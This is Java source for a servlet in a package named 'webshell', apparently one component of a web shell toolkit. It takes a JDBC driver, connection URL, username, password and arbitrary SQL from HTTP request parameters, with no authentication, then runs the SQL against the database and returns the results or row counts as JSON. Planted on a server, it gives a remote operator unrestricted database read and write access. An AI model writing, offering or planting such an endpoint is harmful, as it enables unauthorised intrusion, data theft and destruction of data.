package webshell.servlet;

import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.alibaba.fastjson.JSON;

@SuppressWarnings("serial")
public class JdbcServlet extends HttpServlet {

	@Override
	protected void service(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		request.setCharacterEncoding("UTF-8");

		String driver = request.getParameter("driver");
		String url = request.getParameter("url");
		String user = request.getParameter("user");
		String password = request.getParameter("password");
		String limit = request.getParameter("limit");
		String sql = request.getParameter("sql");

		Map<String, Object> resp = execute(driver, url, user, password, limit, sql);

		response.setStatus(HttpServletResponse.SC_OK);
		response.setCharacterEncoding("UTF-8");
		response.getWriter().write(JSON.toJSONString(resp));
		response.flushBuffer();
	}

	private Map<String, Object> execute(String driver, String url, String user, String password, String limit,
			String sql) {
		Map<String, Object> resp = new HashMap<String, Object>();
		// correct sql
		sql = sql.trim();
		if (sql.endsWith(";")) {
			sql = sql.substring(0, sql.length() - 1);
		}
		int lm = 0;
		if (limit != null && limit.trim().length() > 0) {
			lm = Integer.parseInt(limit);
		}
		// is query or update
		boolean isQuery = sql.substring(0, 6).toLowerCase().equals("select");
		// execute
		Connection conn = null;
		try {
			Class.forName(driver);
			conn = DriverManager.getConnection(url, user, password);
			Statement st = conn.createStatement();
			if (isQuery) {
				ResultSet rs = st.executeQuery(sql);
				List<List<String>> resultData = new ArrayList<List<String>>();
				ResultSetMetaData meta = rs.getMetaData();
				int columnCount = meta.getColumnCount();
				List<String> headerRow = new ArrayList<String>();
				for (int i = 1; i <= columnCount; i++) {
					headerRow.add(meta.getColumnLabel(i));
				}
				resultData.add(headerRow);
				int rn = 0;
				while (rs.next()) {
					rn++;
					List<String> row = new ArrayList<String>();
					for (int i = 1; i <= columnCount; i++) {
						row.add(rs.getString(i));
					}
					resultData.add(row);
					if (lm > 0 && rn >= lm) {
						break;
					}
				}
				resp.put("resultData", resultData);
			} else {
				int updated = st.executeUpdate(sql);
				resp.put("message", updated + " rows.");
			}
		} catch (Exception e) {
			resp.put("message", e.getClass().getName() + ": " + e.getMessage());
		} finally {
			if (conn != null) {
				try {
					conn.close();
				} catch (SQLException e) {
				}
			}
		}
		return resp;
	}

}
